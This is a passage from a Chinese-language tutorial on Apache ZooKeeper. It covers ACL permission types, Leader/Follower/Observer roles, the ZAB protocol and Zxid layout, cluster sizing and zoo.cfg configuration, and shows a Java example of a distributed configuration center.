    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">authenticate</span><span class="hljs-params">()</span> {
        zk.addAuthInfo(<span class="hljs-string">"digest"</span>, <span class="hljs-string">"user1:password1"</span>.getBytes());
    }
}
</code></pre>
<p><strong>ACL 权限类型</strong>：</p>
<ul>
<li><strong>CREATE</strong>：创建子节点权限</li>
<li><strong>READ</strong>：读取节点数据和子节点列表权限</li>
<li><strong>WRITE</strong>：设置节点数据权限</li>
<li><strong>DELETE</strong>：删除子节点权限</li>
<li><strong>ADMIN</strong>：设置ACL权限</li>
</ul>
<h2 data-id="heading-20">3. ZooKeeper 集群架构深度解析</h2>
<h3 data-id="heading-21">3.1 集群角色详细职责</h3>
<h4 data-id="heading-22">3.1.1 Leader 核心职责</h4>
<p>Leader 是 ZooKeeper 集群的核心，负责所有写操作和集群协调。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant C as Client
    participant L as Leader
    participant F1 as Follower1
    participant F2 as Follower2
    participant F3 as Follower3
    
    Note over L: 写请求两阶段提交过程
    
    C-&gt;&gt;L: 写请求(setData /create)
    Note over L: 阶段1: 提案广播
    L-&gt;&gt;L: 生成Zxid (0x100000005)
    L-&gt;&gt;F1: PROPOSAL(zxid, data)
    L-&gt;&gt;F2: PROPOSAL(zxid, data)
    L-&gt;&gt;F3: PROPOSAL(zxid, data)
    
    Note over F1,F3: 阶段1: 确认提案
    F1-&gt;&gt;L: ACK(zxid)
    F2-&gt;&gt;L: ACK(zxid)
    F3-&gt;&gt;L: ACK(zxid)
    
    Note over L: 收到半数以上ACK&lt;br/&gt;开始提交
    
    Note over L: 阶段2: 提交广播
    L-&gt;&gt;F1: COMMIT(zxid)
    L-&gt;&gt;F2: COMMIT(zxid)
    L-&gt;&gt;F3: COMMIT(zxid)
    L-&gt;&gt;L: 应用事务到本地
    
    L-&gt;&gt;C: 写成功响应
    
    Note over F1,F3: 应用事务到本地存储
</code></pre>
<p><strong>Leader 具体职责</strong>：</p>
<ol>
<li>
<p><strong>事务请求处理</strong>：</p>
<ul>
<li>接收并验证所有写请求</li>
<li>为每个事务分配全局唯一的 Zxid</li>
<li>保证事务的原子性和顺序性</li>
</ul>
</li>
<li>
<p><strong>提案广播</strong>：</p>
<ul>
<li>将写请求转化为事务提案</li>
<li>向所有 Follower 广播提案</li>
<li>收集 Follower 的确认响应</li>
</ul>
</li>
<li>
<p><strong>事务提交</strong>：</p>
<ul>
<li>在收到半数以上确认后提交事务</li>
<li>通知所有参与者提交事务</li>
<li>维护事务日志和快照</li>
</ul>
</li>
<li>
<p><strong>集群管理</strong>：</p>
<ul>
<li>监控 Follower 状态</li>
<li>处理新服务器加入</li>
<li>维护集群元数据</li>
</ul>
</li>
</ol>
<h4 data-id="heading-23">3.1.2 Follower 核心职责</h4>
<p>Follower 处理读请求并参与写操作的共识过程。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FollowerResponsibilities</span> {
    <span class="hljs-keyword">private</span> ZooKeeperServer zkServer;
    
    <span class="hljs-comment">// 处理读请求 - 直接从本地内存响应</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReadRequest</span><span class="hljs-params">(Request request)</span> {
        <span class="hljs-comment">// 读操作不需要共识，直接返回本地数据</span>
        <span class="hljs-comment">// 这提供了高性能的读操作</span>
        <span class="hljs-type">byte</span>[] data = zkServer.getData(request.getPath());
        sendResponse(request, data);
    }
    
    <span class="hljs-comment">// 处理写请求 - 转发给Leader</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleWriteRequest</span><span class="hljs-params">(Request request)</span> {
        <span class="hljs-comment">// 写操作必须由Leader处理</span>
        forwardToLeader(request);
    }
    
    <span class="hljs-comment">// 参与Leader选举</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">participateInElection</span><span class="hljs-params">(Vote currentVote)</span> {
        <span class="hljs-comment">// 与其他服务器交换投票信息</span>
        <span class="hljs-comment">// 根据(Zxid, serverId)规则投票</span>
        <span class="hljs-type">Vote</span> <span class="hljs-variable">newVote</span> <span class="hljs-operator">=</span> decideVote(currentVote, receivedVotes);
        broadcastVote(newVote);
    }
    
    <span class="hljs-comment">// 与Leader同步数据</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncWithLeader</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 接收Leader的PROPOSAL消息</span>
        <span class="hljs-comment">// 验证并记录事务日志</span>
        <span class="hljs-comment">// 在收到COMMIT后应用事务</span>
    }
}
</code></pre>
<h4 data-id="heading-24">3.1.3 Observer 特殊角色</h4>
<p>Observer 用于扩展读性能而不影响写性能。</p>
<p><strong>设计价值</strong>：</p>
<ul>
<li><strong>读扩展性</strong>：分担 Follower 的读请求压力</li>
<li><strong>写性能保护</strong>：不参与投票，避免选举和写操作的性能瓶颈</li>
<li><strong>网络优化</strong>：可以在不同机房部署，提供就近读取</li>
</ul>
<p><strong>配置示例</strong>：</p>
<pre><code class="hljs language-properties" lang="properties"># 在 zoo.cfg 中标识 Observer
peerType=observer

# 在集群配置中标记特定服务器为 Observer
server.1=zk1:2888:3888
server.2=zk2:2888:3888  
server.3=zk3:2888:3888
server.4=zk4:2888:3888:observer  # 标记为Observer
server.5=zk5:2888:3888:observer  # 标记为Observer
</code></pre>
<h3 data-id="heading-25">3.2 ZAB 协议深度解析</h3>
<p>ZAB（ZooKeeper Atomic Broadcast）协议是 ZooKeeper 实现数据一致性的核心算法。</p>
<h4 data-id="heading-26">3.2.1 Zxid 结构详解</h4>
<p>Zxid 是 64 位的全局事务ID，结构如下：</p>
<pre><code class="hljs language-scss" lang="scss">Zxid (<span class="hljs-number">64</span>位)
┌────────────────────────────────┬────────────────────────────────┐
│           Epoch (<span class="hljs-number">32</span>位)         │          Counter (<span class="hljs-number">32</span>位)        │
└────────────────────────────────┴────────────────────────────────┘
</code></pre>
<p><strong>组成部分</strong>：</p>
<ul>
<li><strong>Epoch</strong>：Leader 任期编号，每次新 Leader 选举时递增</li>
<li><strong>Counter</strong>：事务计数器，每个新事务递增，从0开始</li>
</ul>
<p><strong>示例序列</strong>：</p>
<pre><code class="hljs language-bash" lang="bash">0x0000000100000000  <span class="hljs-comment"># Epoch=1, Counter=0 (初始状态)</span>
0x0000000100000001  <span class="hljs-comment"># Epoch=1, Counter=1 (第一个事务)</span>
0x0000000100000002  <span class="hljs-comment"># Epoch=1, Counter=2 (第二个事务)</span>
0x0000000200000000  <span class="hljs-comment"># Epoch=2, Counter=0 (新Leader选举)</span>
0x0000000200000001  <span class="hljs-comment"># Epoch=2, Counter=1 (新任期第一个事务)</span>
</code></pre>
<h4 data-id="heading-27">3.2.2 ZAB 协议四个阶段详细流程</h4>
<p><strong>阶段一：选举阶段（Leader Election）</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    Start[服务器启动/Leader失效] --&gt; Looking[进入LOOKING状态]
    Looking --&gt; Broadcast[广播投票信息]
    
    subgraph 投票信息内容
        Broadcast --&gt; VoteContent[包含: sid, zxid, epoch]
    end
    
    Broadcast --&gt; Receive[接收其他服务器投票]
    Receive --&gt; Compare{比较投票优先级}
    
    Compare --&gt; |对方优先级更高| Update[更新自己的投票]
    Compare --&gt; |自己优先级更高| Keep[保持自己的投票]
    Compare --&gt; |优先级相同| CompareSid[比较服务器ID]
    
    Update --&gt; Collect[收集投票]
    Keep --&gt; Collect
    CompareSid --&gt; |对方SID更大| Update
    CompareSid --&gt; |自己SID更大| Keep
    
    Collect --&gt; Check{收到多数派投票?}
    Check --&gt; |是| Leader[成为准Leader]
    Check --&gt; |否| Continue[继续选举过程]
    
    Leader --&gt; Discovery[进入发现阶段]
    Continue --&gt; Broadcast
</code></pre>
<p><strong>选举算法规则</strong>：</p>
<ol>
<li><strong>比较 Epoch</strong>：Epoch 大的优先级更高</li>
<li><strong>比较 Zxid</strong>：Epoch 相同时，Zxid 大的优先级更高</li>
<li><strong>比较 Server ID</strong>：Zxid 相同时，Server ID 大的优先级更高</li>
</ol>
<p><strong>阶段二：发现阶段（Discovery）</strong></p>
<p>发现阶段的主要目标是同步集群状态，确保数据一致性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DiscoveryPhase</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(QuorumPeer self)</span> {
        <span class="hljs-comment">// 1. 收集Follower的lastZxid</span>
        Map&lt;Long, Long&gt; followerLastZxids = collectFollowerLastZxids();
        
        <span class="hljs-comment">// 2. 确定同步点</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">syncPoint</span> <span class="hljs-operator">=</span> calculateSyncPoint(followerLastZxids);
        
        <span class="hljs-comment">// 3. 发送NEWLEADER包</span>
        <span class="hljs-type">NewLeaderPacket</span> <span class="hljs-variable">newLeaderPacket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NewLeaderPacket</span>(
            self.getId(), 
            self.getCurrentEpoch(), 
            syncPoint
        );
        broadcastToFollowers(newLeaderPacket);
        
        <span class="hljs-comment">// 4. 等待ACK确认</span>
        waitForAckFromQuorum();
        
        <span class="hljs-comment">// 5. 更新集群状态</span>
        self.setCurrentEpoch(self.getCurrentEpoch() + <span class="hljs-number">1</span>);
    }
}
</code></pre>
<p><strong>阶段三：同步阶段（Synchronization）</strong></p>
<p>同步阶段确保所有服务器具有相同的数据状态。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizationPhase</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">synchronizeFollowers</span><span class="hljs-params">(<span class="hljs-type">long</span> syncPoint)</span> {
        <span class="hljs-comment">// 1. 获取需要同步的事务</span>
        List&lt;Proposal&gt; transactionsToSync = 
            transactionLog.getTransactionsAfter(syncPoint);
        
        <span class="hljs-comment">// 2. 按顺序发送事务给Follower</span>
        <span class="hljs-keyword">for</span> (Proposal proposal : transactionsToSync) {
            sendProposalToFollowers(proposal);
            waitForAckFromQuorum();
            sendCommitToFollowers(proposal);
        }
        
        <span class="hljs-comment">// 3. 验证同步完成</span>
        validateSynchronization();
    }
}
</code></pre>
<p><strong>阶段四：广播阶段（Broadcast）</strong></p>
<p>广播阶段是 ZAB 协议的正常工作模式，处理客户端请求。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BroadcastPhase</span> {
    <span class="hljs-comment">// 两阶段提交处理写请求</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processWriteRequest</span><span class="hljs-params">(WriteRequest request)</span> {
        <span class="hljs-comment">// 阶段1：提案</span>
        <span class="hljs-type">Proposal</span> <span class="hljs-variable">proposal</span> <span class="hljs-operator">=</span> createProposal(request);
        broadcastProposal(proposal);
        
        <span class="hljs-comment">// 等待ACK</span>
        <span class="hljs-keyword">if</span> (receiveAckFromQuorum()) {
            <span class="hljs-comment">// 阶段2：提交</span>
            broadcastCommit(proposal);
            applyToLocal(proposal);
            sendResponseToClient(request, SUCCESS);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 提交失败</span>
            sendResponseToClient(request, FAILURE);
        }
    }
    
    <span class="hljs-comment">// 处理读请求 - 直接返回本地数据</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processReadRequest</span><span class="hljs-params">(ReadRequest request)</span> {
        <span class="hljs-comment">// 读操作不需要共识，直接返回</span>
        <span class="hljs-type">byte</span>[] data = getLocalData(request.getPath());
        sendResponseToClient(request, data);
    }
}
</code></pre>
<h3 data-id="heading-28">3.3 ZAB Java 实现的优化</h3>
<p>在实际的 Java 实现中，ZAB 协议进行了优化：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FastLeaderElection</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ElectionProtocol</span> {
    <span class="hljs-comment">// 快速领导者选举算法</span>
    <span class="hljs-keyword">public</span> Vote <span class="hljs-title function_">lookForLeader</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-comment">// 1. 自增逻辑时钟</span>
        logicalclock.incrementAndGet();
        
        <span class="hljs-comment">// 2. 初始化投票给自己</span>
        <span class="hljs-type">Vote</span> <span class="hljs-variable">currentVote</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vote</span>(myid, getLastLoggedZxid());
        
        <span class="hljs-comment">// 3. 广播投票</span>
        sendNotifications();
        
        <span class="hljs-comment">// 4. 收集投票并决策</span>
        <span class="hljs-keyword">while</span> (!haveQuorum(currentVote)) {
            <span class="hljs-type">Notification</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> receiveQueue.poll(timeout, TimeUnit.MILLISECONDS);
            <span class="hljs-keyword">if</span> (n == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;
            
            <span class="hljs-comment">// 根据规则更新投票</span>
            currentVote = updateVote(currentVote, n);
        }
        
        <span class="hljs-keyword">return</span> currentVote;
    }
}
</code></pre>
<p><strong>优化要点</strong>：</p>
<ol>
<li><strong>快速选举</strong>：减少选举时间，提高系统可用性</li>
<li><strong>阶段合并</strong>：发现阶段和同步阶段合并为恢复阶段</li>
<li><strong>异步处理</strong>：使用队列和线程池提高并发性能</li>
</ol>
<h3 data-id="heading-29">3.4 集群部署最佳实践</h3>
<h4 data-id="heading-30">3.4.1 服务器数量规划</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClusterPlanning</span> {
    <span class="hljs-comment">/**
     * 计算最优集群规模
     * <span class="hljs-doctag">@param</span> expectedFaultTolerance 期望容错节点数
     * <span class="hljs-doctag">@param</span> readWriteRatio 读写比例
     * <span class="hljs-doctag">@param</span> expectedClients 预期客户端数量
     * <span class="hljs-doctag">@return</span> 推荐的服务器配置
     */</span>
    <span class="hljs-keyword">public</span> ClusterConfig <span class="hljs-title function_">calculateOptimalConfig</span><span class="hljs-params">(<span class="hljs-type">int</span> expectedFaultTolerance, 
                                               <span class="hljs-type">double</span> readWriteRatio,
                                               <span class="hljs-type">int</span> expectedClients)</span> {
        <span class="hljs-comment">// 基础服务器数量：2f + 1</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">baseServers</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span> * expectedFaultTolerance + <span class="hljs-number">1</span>;
        
        <span class="hljs-comment">// 根据读写比例调整Observer数量</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">observerCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-keyword">if</span> (readWriteRatio &gt; <span class="hljs-number">5</span>) { <span class="hljs-comment">// 读多写少场景</span>
            observerCount = Math.max(<span class="hljs-number">1</span>, expectedClients / <span class="hljs-number">1000</span>);
        }
        
        <span class="hljs-comment">// 总服务器数量</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">totalServers</span> <span class="hljs-operator">=</span> baseServers + observerCount;
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClusterConfig</span>(baseServers, observerCount, totalServers);
    }
}

<span class="hljs-comment">// 使用示例</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeploymentExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ClusterPlanning</span> <span class="hljs-variable">planner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClusterPlanning</span>();
        
        <span class="hljs-comment">// 场景1：容忍1台故障，读写均衡</span>
        <span class="hljs-type">ClusterConfig</span> <span class="hljs-variable">config1</span> <span class="hljs-operator">=</span> planner.calculateOptimalConfig(<span class="hljs-number">1</span>, <span class="hljs-number">1.0</span>, <span class="hljs-number">100</span>);
        System.out.println(<span class="hljs-string">"场景1: "</span> + config1); <span class="hljs-comment">// 3台服务器，0个Observer</span>
        
        <span class="hljs-comment">// 场景2：容忍2台故障，读多写少</span>
        <span class="hljs-type">ClusterConfig</span> <span class="hljs-variable">config2</span> <span class="hljs-operator">=</span> planner.calculateOptimalConfig(<span class="hljs-number">2</span>, <span class="hljs-number">10.0</span>, <span class="hljs-number">5000</span>);
        System.out.println(<span class="hljs-string">"场景2: "</span> + config2); <span class="hljs-comment">// 5台服务器 + 5个Observer</span>
    }
}
</code></pre>
<h4 data-id="heading-31">3.4.2 配置文件详解</h4>
<pre><code class="hljs language-properties" lang="properties"># zoo.cfg - 核心配置
tickTime=2000
initLimit=10
syncLimit=5
dataDir=/var/lib/zookeeper
dataLogDir=/var/lib/zookeeper/logs  # 事务日志单独目录，提高性能
clientPort=2181
maxClientCnxns=60

# 自动清理配置
autopurge.snapRetainCount=5
autopurge.purgeInterval=6

# 高级性能配置
preAllocSize=65536      # 预分配文件大小
snapCount=100000        # 多少次事务后做快照
maxSessionTimeout=40000 # 最大会话超时
minSessionTimeout=4000  # 最小会话超时

# 集群配置 - 生产环境示例
server.1=zk1.cluster.com:2888:3888
server.2=zk2.cluster.com:2888:3888
server.3=zk3.cluster.com:2888:3888
server.4=zk4.cluster.com:2888:3888:observer  # 读扩展节点
server.5=zk5.cluster.com:2888:3888:observer  # 读扩展节点
</code></pre>
<h4 data-id="heading-32">3.4.3 硬件和网络规划</h4>
<p><strong>硬件建议</strong>：</p>
<ul>
<li><strong>内存</strong>：至少8GB，根据节点数量和数据量调整</li>
<li><strong>磁盘</strong>：SSD硬盘，独立磁盘用于事务日志</li>
<li><strong>CPU</strong>：多核处理器，ZooKeeper CPU 使用通常不高</li>
<li><strong>网络</strong>：低延迟、高带宽的内部网络</li>
</ul>
<p><strong>部署拓扑</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "主数据中心"
        Client1[客户端] --&gt; LB[负载均衡器]
        LB --&gt; ZK1[ZooKeeper1 Leader]
        LB --&gt; ZK2[ZooKeeper2 Follower]
        LB --&gt; ZK3[ZooKeeper3 Follower]
    end
    
    subgraph "备用数据中心"
        Client2[客户端] --&gt; LB2[负载均衡器]
        LB2 --&gt; ZK4[ZooKeeper4 Observer]
        LB2 --&gt; ZK5[ZooKeeper5 Observer]
    end
    
    ZK1 -.-&gt; ZK4
    ZK2 -.-&gt; ZK5
    ZK3 -.-&gt; ZK4
</code></pre>
<h2 data-id="heading-33">4. 企业级应用场景深度实现</h2>
<h3 data-id="heading-34">4.1 分布式配置管理中心</h3>
<p>分布式配置管理是 ZooKeeper 最典型的应用场景之一。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedConfigCenter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ZooKeeper zk;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String configBasePath;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map&lt;String, String&gt; localConfigCache;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;ConfigListener&gt; listeners;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">DistributedConfigCenter</span><span class="hljs-params">(String connectString, String basePath)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-built_in">this</span>.configBasePath = basePath;
        <span class="hljs-built_in">this</span>.localConfigCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
        <span class="hljs-built_in">this</span>.listeners = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();
        
        <span class="hljs-comment">// 创建ZooKeeper连接</span>
        <span class="hljs-built_in">this</span>.zk = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZooKeeper</span>(connectString, <span class="hljs-number">15000</span>, <span class="hljs-built_in">this</span>::processWatchEvent);
        
        <span class="hljs-comment">// 初始化配置</span>
        initializeConfigCenter();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initializeConfigCenter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 确保配置根目录存在</span>
        ensurePathExists(configBasePath);
        
        <span class="hljs-comment">// 加载所有现有配置</span>
        loadAllConfigs();
        
        <span class="hljs-comment">// 监听配置变化</span>
        watchConfigChanges();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ensurePathExists</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (zk.exists(path, <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 递归创建路径</span>
            String[] parts = path.substring(<span class="hljs-number">1</span>).split(<span class="hljs-string">"/"</span>);
            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">currentPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
            
            <span class="hljs-keyword">for</span> (String part : parts) {
                currentPath.append(<span class="hljs-string">"/"</span>).append(part);
                <span class="hljs-keyword">if</span> (zk.exists(currentPath.toString(), <span class="hljs-literal">false</span>) == <span class="hljs-literal">null</span>) {
                    zk.create(currentPath.toString(), 
                             <span class="hljs-literal">null</span>, 
                             ZooDefs.Ids.OPEN_ACL_UNSAFE, 
                             CreateMode.PERSISTENT);
                }
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadAllConfigs</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        List&lt;String&gt; configNodes = zk.getChildren(configBasePath, <span class="hljs-literal">false</span>);
        
        <span class="hljs-keyword">for</span> (String configNode : configNodes) {
            <span class="hljs-type">String</span> <span class="hljs-variable">configPath</span> <span class="hljs-operator">=</span> configBasePath + <span class="hljs-string">"/"</span> + configNode;
            <span class="hljs-type">byte</span>[] data = zk.getData(configPath, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
            <span class="hljs-type">String</span> <span class="hljs-variable">configValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(data, StandardCharsets.UTF_8);
            
            localConfigCache.put(configNode, configValue);
            System.out.println(<span class="hljs-string">"加载配置: "</span> + configNode + <span class="hljs-string">" = "</span> + configValue);
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">watchConfigChanges</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 监听配置目录的子节点变化</span>
        zk.getChildren(configBasePath, event -&gt; {
            <span class="hljs-keyword">if</span> (event.getType() == EventType.NodeChildrenChanged) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// 重新加载所有配置</span>
                    loadAllConfigs();
                    notifyListeners();
                    
                    <span class="hljs-comment">// 重新注册监听</span>
                    watchConfigChanges();
                } <span class="hljs-keyword">catch</span> (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        
        <span class="hljs-comment">// 监听每个配置节点的数据变化</span>
        <span class="hljs-keyword">for</span> (String configNode : localConfigCache.keySet()) {
            <span class="hljs-type">String</span> <span class="hljs-variable">configPath</span> <span class="hljs-operator">=</span> configBasePath + <span class="hljs-string">"/"</span> + configNode;
            zk.getData(configPath, event -&gt; {
                <span class="hljs-keyword">if</span> (event.getType() == EventType.NodeDataChanged) {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-type">byte</span>[] newData = zk.getData(configPath, <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span>);
                        <span class="hljs-type">String</span> <span class="hljs-variable">newValue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(newData, StandardCharsets.UTF_8);
                        
                        localConfigCache.put(configNode, newValue);
                        System.out.println(<span class="hljs-string">"配置更新: "</span> + configNode + <span class="hljs-string">" = "</span> + newValue);
                        
                        notifyListeners();
                        
                        <span class="hljs-comment">// 重新注册监听</span>
                        zk.getData(configPath, <span class="hljs-built_in">this</span>::processWatchEvent, <span class="hljs-literal">null</span>);
                    } <span class="hljs-keyword">catch</span> (Exception e) {
                        e.printStackTrace();
                    }
                }
            }, <span class="hljs-literal">null</span>);
        }
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConfig</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> localConfigCache.get(key);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setConfig</span><span class="hljs-params">(String key, String value)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">configPath</span> <span class="hljs-operator">=</span> configBasePath + <span class="hljs-string">"/"</span> + key;
        
        <span class="hljs-keyword">if</span> (zk.exists(configPath, <span class="hljs-literal">false</span>) != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 更新现有配置</span>
            zk.setData(configPath, value.getBytes(StandardCharsets.UTF_8), -<span class="hljs-number">1</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 创建新配置</span>
            zk.create(configPath, 
                     value.getBytes(StandardCharsets.UTF_8),
                     ZooDefs.Ids.OPEN_ACL_UNSAFE,
                     CreateMode.PERSISTENT);
        }
        
        localConfigCache.put(key, value);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addConfigListener</span><span class="hljs-params">(ConfigListener listener)</span> {
        listeners.add(listener);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyListeners</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">for</span> (ConfigListener listener : listeners) {
            listener.onConfigChanged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(localConfigCache));
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ConfigListener</span> {
        <span class="hljs-keyword">void</span> <span class="hljs-title function_">onConfigChanged</span><span class="hljs-params">(Map&lt;String, String&gt; newConfig)</span>;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processWatchEvent</span><span class="hljs-params">(WatchedEvent event)</span> {
        <span class="hljs-comment">// 处理会话事件</span>
        <span class="hljs-keyword">if</span> (event.getType() == EventType.None) {
            <span class="hljs-keyword">switch</span> (event.getState()) {
                <span class="hljs-keyword">case</span> Expired:
                    System.out.println(<span class="hljs-string">"会话过期，需要重新连接"</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> SyncConnected:
                    System.out.println(<span class="hljs-string">"成功连接到ZooKeeper"</span>);
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> Disconnected:
                    System.out.println(<span class="hljs-string">"与ZooKeeper断开连接"</span>);
                    <span class="hljs-keyword">break</span>;
            }
        }
    }
}
</code></pre>
<p><strong>配置中心使用示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigCenterExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 创建配置中心</span>
        <span class="hljs-type">DistributedConfigCenter</span> <span class="hljs-variable">configCenter</span> <span class="hljs-operator">=</span> 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">DistributedConfigCenter</span>(<span class="hljs-string">"localhost:2181"</span>, <span class="hljs-string">"/app/config"</span>);
        
        <span class="hljs-comment">// 添加配置监听器</span>
        configCenter.addConfigListener(newConfig -&gt; {
            System.out.println(<span class="hljs-string">"配置发生变化: "</span> + newConfig);
        });
        
        <span class="hljs-comment">// 设置配置</span>
        configCenter.setConfig(<span class="hljs-string">"database.url"</span>, <span class="hljs-string">"jdbc:mysql://localhost:3306/app"</span>);
        configCenter.setConfig(<span class="hljs-string">"cache.enabled"</span>, <span class="hljs-string">"true"</span>);
        configCenter.setConfig(<span class="hljs-string">"thread.pool.size"</span>, <span class="hljs-string">"10"</span>);
        
        <span class="hljs-comment">// 获取配置</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">dbUrl</span> <span class="hljs-operator">=</span> configCenter.getConfig(<span class="hljs-string">"database.url"</span>);
        System.out.println(<span class="hljs-string">"数据库URL: "</span> + dbUrl);
        
        <span class="hljs-comment">// 模拟配置更新</span>
        Thread.sleep(<span class="hljs-number">30000</span>);
        configCenter.setConfig(<span class="hljs-string">"thread.pool.size"</span>, <span class="hljs-string">"20"</span>);
    }
}
</code></pre>
<h3 data-id="heading-35">4.2 高可用分布式锁实现</h3>
